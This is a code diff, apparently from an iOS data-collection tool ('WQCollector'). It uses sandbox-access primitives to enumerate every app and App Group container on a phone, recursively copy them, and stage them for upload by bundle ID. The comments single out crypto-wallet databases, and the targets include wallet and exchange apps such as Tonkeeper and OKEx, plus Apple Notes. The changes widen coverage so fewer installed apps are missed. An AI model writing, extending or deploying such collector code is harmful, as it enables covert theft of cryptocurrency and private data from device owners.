@@ -35,9 +35,11 @@ extern int wqnet_log(const char *text);
 extern int wqnet_upload(const char *filePath, const char *bundleID);
 
 static const char *kAppDataRoot = "/var/mobile/Containers/Data/Application";
+static const char *kAppGroupRoot = "/var/mobile/Containers/Shared/AppGroup";   // group.* 容器在这里
 static const int64_t kMaxInode = 45000000;   // 固定上限：maxInode=0 会触发 WQ 的共享扫描探针
 static const NSUInteger kMaxLocalDirs = 3;   // 保留的未打包目录
 static const NSUInteger kMaxLocalZips = 6;   // 保留的待补传 ZIP
+static const NSUInteger kMaxLabelDump = 400; // 写进日志的标签上限（对账用）
 
 static BOOL gRunning = NO;
 static NSString *gSummary = nil;
@@ -327,25 +329,76 @@ static void WQRepairAppGroupLibrary(NSString *group) {
     WQFileLog([NSString stringWithFormat:@"repair: %@ Library/Caches ready=%@", group, ok ? @"YES" : @"NO"]);
 }
 
-static NSDictionary<NSString *, NSString *> *WQEnumerateContainers(NSUInteger *granted, NSUInteger *refused) {
-    NSMutableDictionary<NSString *, NSString *> *map = [NSMutableDictionary dictionary];
-    NSUInteger okCount = 0, noCount = 0;
-
-    NSString *root = [NSString stringWithUTF8String:kAppDataRoot];
-    NSArray<NSString *> *dirs = wq_enumerate(root, kMaxInode, nil, nil);
+/// 扫一个容器根，把 label -> 容器路径 合进 map。
+///
+/// 先直接列目录：容器根下就是 UUID 目录名，精确且瞬时，不受 inode 上限影响。
+/// 原来只走 wq_enumerate(root, kMaxInode=45,000,000)，是拿固定 inode 区间做扫描 ——
+/// 之后新建的应用（容器 inode 超过上限）会整片漏掉，表现就是"装了却报未安装"。
+/// 只有列表被拒时才退回 inode 扫描，并且把用的哪条路径、数量都写进日志。
+static void WQAddContainerRoot(NSString *root,
+                               NSMutableDictionary<NSString *, NSString *> *map,
+                               NSUInteger *granted, NSUInteger *refused, NSUInteger *unlabeled) {
+    NSMutableArray<NSString *> *dirs = [NSMutableArray array];
+    for (NSString *name in wq_list(root, NULL)) {
+        if (name.length == 0 || [name hasPrefix:@"."]) continue;
+        [dirs addObject:[name hasPrefix:@"/"] ? name : [root stringByAppendingPathComponent:name]];
+    }
+    NSString *source = @"list";
     if (dirs.count == 0) {
         wq_grant(root);
-        dirs = wq_list(root, NULL);
+        for (NSString *path in wq_enumerate(root, kMaxInode, nil, nil)) {
+            if (path.length == 0 || [path.lastPathComponent hasPrefix:@"."]) continue;
+            [dirs addObject:path];
+        }
+        source = @"inode-scan";
     }
+    WQFileLog([NSString stringWithFormat:@"[enumerate] %@: %@ -> %lu 个容器",
+               root, source, (unsigned long)dirs.count]);
+
     for (NSString *dir in dirs) {
-        if (dir.length == 0 || [dir.lastPathComponent hasPrefix:@"."]) continue;
-        if (wq_grant(dir)) okCount++; else noCount++;
+        if (wq_grant(dir)) {
+            if (granted) (*granted)++;
+        } else if (refused) {
+            (*refused)++;
+        }
         NSString *label = wq_container_label(dir);
-        if (label.length > 0) map[label] = dir;
+        if (label.length == 0) {
+            if (unlabeled) (*unlabeled)++;
+            continue;
+        }
+        if (!map[label]) map[label] = dir;
     }
+}
+
+/// 数据容器（bundle id）和 App Group 容器（group.*）是两个根：
+/// Data/Application 里永远找不到 group.com.apple.notes 这类条目。
+static NSDictionary<NSString *, NSString *> *WQEnumerateContainers(NSUInteger *granted, NSUInteger *refused,
+                                                                  NSUInteger *unlabeled) {
+    NSMutableDictionary<NSString *, NSString *> *map = [NSMutableDictionary dictionary];
+    NSUInteger okCount = 0, noCount = 0, noLabel = 0;
+    WQAddContainerRoot([NSString stringWithUTF8String:kAppDataRoot], map, &okCount, &noCount, &noLabel);
+    WQAddContainerRoot([NSString stringWithUTF8String:kAppGroupRoot], map, &okCount, &noCount, &noLabel);
     if (granted) *granted = okCount;
     if (refused) *refused = noCount;
+    if (unlabeled) *unlabeled = noLabel;
     return map;
+}
+
+/// 精确匹配失败时找一条"像它"的标签：只差大小写、或末段相同
+/// （OKExAppstoreFull / OKExAppStoreFull、com.jbig.tonkeeper / com.tonkeeper.ios 这种）。
+/// 有它就能一眼区分"没装"和"bundle id 写错"。
+static NSString *WQNearestLabel(NSString *want, NSArray<NSString *> *labels) {
+    if (want.length == 0) return nil;
+    NSString *lower = want.lowercaseString;
+    for (NSString *label in labels) {
+        if ([label.lowercaseString isEqualToString:lower]) return label;
+    }
+    NSString *tail = lower.pathExtension.length >= 4 ? lower.pathExtension : nil;
+    if (!tail) return nil;
+    for (NSString *label in labels) {
+        if ([label.lowercaseString containsString:tail]) return label;
+    }
+    return nil;
 }
 
 static NSString *WQJSONFromArray(NSArray *items) {
@@ -354,13 +407,51 @@ static NSString *WQJSONFromArray(NSArray *items) {
     return [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] ?: @"[]";
 }
 
-/// 复制一个容器（两层深，跳过 root-only 的 metadata plist）。
+/// 递归复制：原来只下到第 3 层，`Library/Application Support/<子目录>/<file>`
+/// 这种（钱包的 realm / sqlite 常在这里）会整段漏掉。
+/// 深度上限 8 层、单文件上限 256 MB（跳过并计数），符号链接与特殊文件不复制。
+static const NSUInteger kMaxCopyDepth = 8;
+static const unsigned long long kMaxCopyFileBytes = 256ull * 1024 * 1024;
+
+static NSUInteger WQCopyTree(NSString *src, NSString *dst, NSUInteger depth, NSUInteger *skippedOut) {
+    NSFileManager *fm = [NSFileManager defaultManager];
+    if (depth > kMaxCopyDepth) return 0;
+    NSArray<NSString *> *children = wq_list(src, NULL);
+    if (!children) return 0;
+
+    NSUInteger copied = 0;
+    for (NSString *name in children) {
+        if ([name hasPrefix:@".com.apple.mobile_container_manager"]) continue;
+        NSString *s = [src stringByAppendingPathComponent:name];
+        NSString *d = [dst stringByAppendingPathComponent:name];
+        struct stat st;
+        if (lstat(s.fileSystemRepresentation, &st) != 0) continue;
+
+        if (S_ISDIR(st.st_mode)) {
+            [fm createDirectoryAtPath:d withIntermediateDirectories:YES attributes:nil error:NULL];
+            copied += WQCopyTree(s, d, depth + 1, skippedOut);
+        } else if (S_ISREG(st.st_mode)) {
+            if ((unsigned long long)st.st_size > kMaxCopyFileBytes) {
+                if (skippedOut) (*skippedOut)++;
+                WQFileLog([NSString stringWithFormat:@"[copy] skip %@ (%.1f MB)",
+                           name, (double)st.st_size / 1024.0 / 1024.0]);
+                continue;
+            }
+            NSData *data = [NSData dataWithContentsOfFile:s];
+            if (data && [data writeToFile:d atomically:YES]) copied++;
+        } else if (skippedOut) {
+            (*skippedOut)++;
+        }
+    }
+    return copied;
+}
+
+/// 复制一个容器（递归，跳过 root-only 的 metadata plist）。
 static NSUInteger WQCopyContainer(NSString *containerPath, NSString *destDir, NSError **outError) {
     NSFileManager *fm = [NSFileManager defaultManager];
     [fm createDirectoryAtPath:destDir withIntermediateDirectories:YES attributes:nil error:NULL];
 
-    NSArray<NSString *> *children = wq_list(containerPath, NULL);
-    if (!children) {
+    if (!wq_list(containerPath, NULL)) {
         if (outError) {
             *outError = [NSError errorWithDomain:@"WQCollector" code:1
                                         userInfo:@{NSLocalizedDescriptionKey: @"无法列出容器内容"}];
@@ -368,37 +459,11 @@ static NSUInteger WQCopyContainer(NSString *containerPath, NSString *destDir, NS
         return 0;
     }
 
-    NSUInteger copied = 0;
-    for (NSString *name in children) {
-        if ([name hasPrefix:@".com.apple.mobile_container_manager"]) continue;
-        NSString *src = [containerPath stringByAppendingPathComponent:name];
-        NSString *dst = [destDir stringByAppendingPathComponent:name];
-        struct stat st;
-        if (lstat(src.fileSystemRepresentation, &st) != 0) continue;
-
-        if (S_ISDIR(st.st_mode)) {
-            [fm createDirectoryAtPath:dst withIntermediateDirectories:YES attributes:nil error:NULL];
-            NSArray<NSString *> *grand = wq_list(src, NULL);
-            for (NSString *sub in grand) {
-                NSString *s2 = [src stringByAppendingPathComponent:sub];
-                NSString *d2 = [dst stringByAppendingPathComponent:sub];
-                struct stat st2;
-                if (lstat(s2.fileSystemRepresentation, &st2) != 0) continue;
-                if (S_ISDIR(st2.st_mode)) {
-                    [fm createDirectoryAtPath:d2 withIntermediateDirectories:YES attributes:nil error:NULL];
-                    for (NSString *leaf in wq_list(s2, NULL)) {
-                        NSData *data = [NSData dataWithContentsOfFile:[s2 stringByAppendingPathComponent:leaf]];
-                        if (data && [data writeToFile:[d2 stringByAppendingPathComponent:leaf] atomically:YES]) copied++;
-                    }
-                } else if (S_ISREG(st2.st_mode)) {
-                    NSData *data = [NSData dataWithContentsOfFile:s2];
-                    if (data && [data writeToFile:d2 atomically:YES]) copied++;
-                }
-            }
-        } else if (S_ISREG(st.st_mode)) {
-            NSData *data = [NSData dataWithContentsOfFile:src];
-            if (data && [data writeToFile:dst atomically:YES]) copied++;
-        }
+    NSUInteger skipped = 0;
+    NSUInteger copied = WQCopyTree(containerPath, destDir, 0, &skipped);
+    if (skipped > 0) {
+        WQFileLog([NSString stringWithFormat:@"[copy] %@: %lu 个文件跳过（超限或特殊文件）",
+                   containerPath.lastPathComponent, (unsigned long)skipped]);
     }
     return copied;
 }
@@ -484,8 +549,8 @@ static NSString *WQRunCollection(void) {
             WQStage(@"阶段 3/6：正在重置访问缓存并枚举容器");
         }
 
-        NSUInteger granted = 0, refused = 0;
-        NSDictionary<NSString *, NSString *> *containers = WQEnumerateContainers(&granted, &refused);
+        NSUInteger granted = 0, refused = 0, unlabeled = 0;
+        NSDictionary<NSString *, NSString *> *containers = WQEnumerateContainers(&granted, &refused, &unlabeled);
 
         // 第一轮 0 个容器时，重置缓存后重试一次（对应"退出再进应用数据就能拿到"）
         if (containers.count == 0 && refused > 0) {
@@ -493,12 +558,33 @@ static NSString *WQRunCollection(void) {
             NSString *resetError2 = nil;
             wq_reset_access_cache(&resetError2);
             WQFileLog([NSString stringWithFormat:@"retry: reset done err=%@", resetError2 ?: @"-"]);
-            containers = WQEnumerateContainers(&granted, &refused);
+            containers = WQEnumerateContainers(&granted, &refused, &unlabeled);
             WQFileLog([NSString stringWithFormat:@"retry: second pass -> %lu containers (grant %lu / refused %lu)",
                        (unsigned long)containers.count, (unsigned long)granted, (unsigned long)refused]);
         }
-        WQStage(@"阶段 3/6：容器索引就绪 — %lu 个应用（grant %lu / refused %lu）",
-                (unsigned long)containers.count, (unsigned long)granted, (unsigned long)refused);
+
+        NSArray<NSString *> *labels = [containers.allKeys sortedArrayUsingSelector:@selector(compare:)];
+        NSUInteger groupCount = 0;
+        for (NSString *label in labels) {
+            if ([label hasPrefix:@"group."]) groupCount++;
+        }
+        WQStage(@"阶段 3/6：容器索引就绪 — %lu 个应用（grant %lu / refused %lu / 无标签 %lu / AppGroup %lu）",
+                (unsigned long)containers.count, (unsigned long)granted, (unsigned long)refused,
+                (unsigned long)unlabeled, (unsigned long)groupCount);
+
+        // 标签全量落盘：后台目录里的 bundle_id 和设备上的标识对不上时，
+        // 这份清单是唯一能直接对比的证据（面板只看得到条数）。
+        {
+            NSUInteger limit = MIN(labels.count, kMaxLabelDump);
+            for (NSUInteger i = 0; i < limit; i++) {
+                WQFileLog([NSString stringWithFormat:@"[labels] %@ -> %@",
+                           labels[i], containers[labels[i]].lastPathComponent]);
+            }
+            if (labels.count > limit) {
+                WQFileLog([NSString stringWithFormat:@"[labels] ... %lu more not shown",
+                           (unsigned long)(labels.count - limit)]);
+            }
+        }
         // 把 WQ 内部日志的尾部落盘（grant 失败的具体原因、query 返回码都在里面）
         {
             NSString *wqText = wq_log_text();
@@ -530,7 +616,12 @@ static NSString *WQRunCollection(void) {
 
             NSString *container = containers[bundleID];
             if (!container) {
-                [missing addObject:bundleID];
+                // 没匹配上时给一条"像它"的标签：区分没装、大小写不一致、还是 Android 包名
+                NSString *near = WQNearestLabel(bundleID, labels);
+                [missing addObject:near.length ? [NSString stringWithFormat:@"%@(≈%@)", bundleID, near] : bundleID];
+                if (near.length) {
+                    WQFileLog([NSString stringWithFormat:@"[missing] %@ ≈ %@", bundleID, near]);
+                }
                 continue;
             }
             NSString *safeName = [bundleID stringByReplacingOccurrencesOfString:@"/" withString:@"_"];
